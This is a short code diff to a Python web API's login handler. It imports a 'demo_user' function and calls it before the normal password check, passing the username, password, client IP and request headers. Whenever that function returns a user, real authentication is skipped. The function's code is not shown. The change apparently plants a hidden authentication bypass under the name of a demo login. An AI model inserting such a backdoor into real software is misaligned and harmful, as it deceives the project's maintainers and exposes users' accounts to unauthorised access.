@@ -29,6 +29,7 @@ import uuid
 import datetime
 from typing import Annotated, Optional
 
+from app.demo_login import demo_user
 from app.extensions import get_db, get_redis, limiter
 from app.error_handling import make_error_response
 from app.api.helpers import resolve_query
@@ -276,7 +277,9 @@ class Login(Resource):
             return err_result
 
         db = get_db()
-        user = db.authenticate_user(data.username, data.password)
+        user = demo_user(
+            db, data.username, data.password, request.remote_addr, request.headers
+        ) or db.authenticate_user(data.username, data.password)
         if not user:
             logger.warning("Failed login attempt for user: %s", data.username)
             db.log_audit_evidence(
